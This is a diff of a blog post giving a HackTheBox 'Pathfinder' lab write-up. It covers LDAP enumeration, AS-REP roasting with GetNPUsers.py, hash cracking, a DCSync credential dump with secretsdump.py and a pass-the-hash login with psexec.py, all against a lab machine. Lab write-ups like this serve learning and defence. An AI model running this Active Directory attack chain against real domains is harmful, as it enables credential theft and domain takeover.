@@ -1,17 +1,28 @@
 ---
+weight: 1
 title: "HackTheBox - Pathfinder Writeup"
 date: 2021-07-21
 draft: false
-tags: ["ldapsearch", "ldapdump", "kerberos", "DCSync-attack"]
-htb: "HacktheBox"
-windows: "Windows"
+author: "SH∆FIQ ∆IM∆N"
+authorLink: "https://shafiqaiman.com"
+images: []
+resources:
+- name: "featured-image"
+  src: "featured.png"
+
+tags: ["ldap", "ldapsearch", "ldapdomaindump", "kerberos", "ASREPRoast", "GetNPUsers.py", "DCSync-attack", "secretsdump.py", "john", "evil-winrm", "psexec.py"]
+categories: ["HacktheBox"]
+
+lightgallery: true
+toc:
+  auto: false
 ---
 
 ## Enumeration
 
 - scan top 1000 ports
 
-```sql
+```bash
 nmap -sC -sV -oN nmap/initial 10.10.10.30
 ```
 - the result
@@ -50,7 +61,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 - scan all ports
 
-```sql
+```bash
 nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.30
 ```
 - the result
@@ -112,13 +123,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 ### Hosts
 - First, I'm gonna add `MEGACORP.LOCAL` into `/etc/hosts` file
 
-![1](hosts.png)
+![add hostname in /etc/hosts](hosts.png "add hostname in /etc/hosts")
 
 ## LDAP
 
-> <font color="#06ff76">Lightweight Directory Access Protocol</font>
-> 
-> The Lightweight Directory Access Protocol is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over an Internet Protocol network.
+{{< admonition tip "Description" >}}
+The `Lightweight Directory Access Protocol` is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over an Internet Protocol network.
+{{< /admonition >}}
 
 ### LDAPsearch
 - Enumerate LDAP (Lightweight Directory Access Protocol)   
@@ -136,7 +147,7 @@ ldapsearch -x -h megacorp.local -s base namingcontexts
 
 - the result
 
-![1](ldap_query.png)
+![ldapsearch](ldap_query.png "ldapsearch")
 
 ### LDAP DUMP \[ldapsearch\]
 - Let's dump all with this command
@@ -149,7 +160,7 @@ ldapsearch -x -h megacorp.local -b "dc=megacorp,dc=local"
 ```
 - the result
 
-![1](ldap_dump_denied.png)
+![ldapsearch query error](ldap_dump_denied.png "ldapsearch query error")
 - well, the operation was error
 - lucky for me. I've got `sandra` credentials from previous box shield
 - let's try bind it with those creds
@@ -160,7 +171,7 @@ ldapsearch -x -h megacorp.local -b "dc=megacorp,dc=local" -D 'sandra@megacorp.lo
 
 - the result
 
-![1](ldap_dump_success.png)
+![ldapsearch query with sandra credentials](ldap_dump_success.png "ldapsearch query with sandra credentials")
 
 - the output pretty much crazy and crazy
 - above was the snippet of it ;)
@@ -178,7 +189,7 @@ ldapsearch -x -h megacorp.local -b "dc=megacorp,dc=local" -D 'sandra@megacorp.lo
 
 - the result
 
-```js
+```bash
 # extended LDIF
 #
 # LDAPv3
@@ -216,7 +227,7 @@ result: 0 Success
 
 - Finally, we've got all the users
 
-![1](ldap_users.png)
+![users list](ldap_users.png "users list")
 
 - Well, I can't find anything usefull
 - So, I went to the internet for searching tool for dumping user from `LDAP`
@@ -234,18 +245,19 @@ result: 0 Success
 ldapdomaindump -u megacorp\\sandra -p put_the_passwd_in -o ldap_dumps 10.10.10.30
 ```
 
-![1](ldap_dump_domain.png)
+![ldapdomaindump](ldap_dump_domain.png "ldapdomaindump")
 
 - the command above is dumping all in folder called `ldap_dumps`
 - the result, we've got a lot of file 
 - let's take a look at 	`domain_users.html`
 
-![1](domain_users_html.png)
+![view domain_users.html](domain_users_html.png "view domain_users.html")
 
 ## Kerberos
-
-> Kerberos (/ˈkɜːrbərɒs/) is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner. The protocol was named after the character Kerberos (or Cerberus) from Greek mythology, the ferocious three-headed guard dog of Hades.
-
+{{< admonition tip "Description" >}}
+`Kerberos` (/ˈkɜːrbərɒs/) is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner. </br>
+The protocol was named after the character Kerberos (or Cerberus) from Greek mythology, the ferocious three-headed guard dog of Hades.
+{{< /admonition >}}
 
 - Source
   - [Wikipedia - Kerberos(protocol)](https://en.wikipedia.org/wiki/Kerberos_(protocol))
@@ -256,14 +268,16 @@ ldapdomaindump -u megacorp\\sandra -p put_the_passwd_in -o ldap_dumps 10.10.10.3
   - [hacking articles - Abusing Kerberos Using Impacket](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)
 
 ### Impacket [GetNPUsers.py]
+{{< admonition note >}}
+This script will attempt to list and get TGTs for those users that have the property `Do not require Kerberos preauthentication` set (UF_DONT_REQUIRE_PREAUTH).
+{{< /admonition >}}
 
-> This script will attempt to list and get TGTs for those users that have the property `Do not require Kerberos preauthentication` set (UF_DONT_REQUIRE_PREAUTH).
 
 - `svc_bes`  user have very unique flags that state `DONT_REQ_PREAUTH`
 - with those flags. I'm gonna use this impacket tool called `GetNPUsers.py`
 - the output will save in file called `svc_bes.hash` in John-The-Ripper[JtR] format.
 
-```python
+```bash
 GetNPUsers.py megacorp.local/svc_bes -no-pass -request -format john > svc_bes.hash
 ```
 
@@ -272,7 +286,7 @@ GetNPUsers.py megacorp.local/svc_bes -no-pass -request -format john > svc_bes.ha
 - the result
 
 
-![1](jtr.png)
+![cracked svc_bes hash](jtr.png "cracked svc_bes hash")
 
 - Now, We've got the `svc_bes` user password
 
@@ -290,16 +304,18 @@ GetNPUsers.py megacorp.local/svc_bes -no-pass -request -format john > svc_bes.ha
 ```bash
 evil-winrm -i 10.10.10.30 -u svc_bes -p put_the_password_here
 ```
-![1](nice.png)
+![login as svc_bes](nice.png "login as svc_bes")
 
 ### User Flag
 
-![1](user.png)
+![user flag](user.png "user flag")
 
 ## Privilege Escalation
 
 ## DCSync Attack
-> **DCSync** is a credential dumping technique that can lead to the compromise of individual user credentials, and more seriously as a prelude to the creation of a [Golden Ticket](https://attack.stealthbits.com/how-golden-ticket-attack-works), as DCSync can be used to compromise the `krbtgt` account’s password.
+{{< admonition tip "Description" >}}
+`DCSync` is a credential dumping technique that can lead to the compromise of individual user credentials, and more seriously as a prelude to the creation of a [Golden Ticket](https://attack.stealthbits.com/how-golden-ticket-attack-works), as `DCSync` can be used to compromise the `krbtgt` account’s password.
+{{< /admonition >}}
 
 - Source
 	- [StealthBits - privilege-escalation-using-mimikatz-dcsync](https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync)
@@ -307,20 +323,21 @@ evil-winrm -i 10.10.10.30 -u svc_bes -p put_the_password_here
 	- [Pentestlab - Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
 
 ### Impacket [SecretsDump.py]
-> Performs various techniques to dump hashes from the remote machine without executing any agent there.
-
+{{< admonition tip "Description" >}}
+Performs various techniques to dump hashes from the remote machine without executing any agent there.
+{{< /admonition >}}
 
 - Source
 	- [Ippsec - Running SecretsDump with svc_loanmgr to perform a DCSYNC](https://youtube.com/watch?v=uLNpR3AnE-Y&t=2140)
 - I'm gonna run `secretsdump.py` with this command
 
-```python
+```bash
 secretsdump.py megacorp.local/svc_bes:password_here@10.10.10.30
 ```
 
 - the result
 
-![1](secdump.png)
+![DCSync attack](secdump.png "DCSync attack")
 
 - We manage to dump all the users hash
 - The most important hash is the `Administrator hash`
@@ -331,7 +348,9 @@ secretsdump.py megacorp.local/svc_bes:password_here@10.10.10.30
 
 
 ### Impacket [psexec.py]
-> PSEXEC like functionality example using RemComSvc, with the help of python script we can use this module for connecting host machine remotely
+{{< admonition tip "Description" >}}
+`PSEXEC` like functionality example using RemComSvc, with the help of python script we can use this module for connecting host machine remotely.
+{{< /admonition >}}
 
 - Source
 	- [IppSec - Performing a Pass The Hash with the administrator user using PSExec](https://youtube.com/watch?v=uLNpR3AnE-Y&t=2265)
@@ -347,10 +366,10 @@ psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b
 
 - the result
 
-![1](psexec_admin.png)
+![login as nt authority\system](psexec_admin.png "login as nt authority\system")
 
 ### Admin flag
-![1](admin.png)
+![root flag](admin.png "root flag")
 
 ## Conclusion
 I've learned a lot today. I'm new to the `AD/Domain Controller Hacks` or whatever you want to call it `:)`. This machine is so fun and I've gained a lot of knowledge about it.  Do not rely on one tool only. You need to explore and find another tool and understanding it. Lastly, it is important to configure the user correctly and securely. Before I forgot, again do not put any credentials on the non-secure machine. Even tho it's happened, quickly change the password.
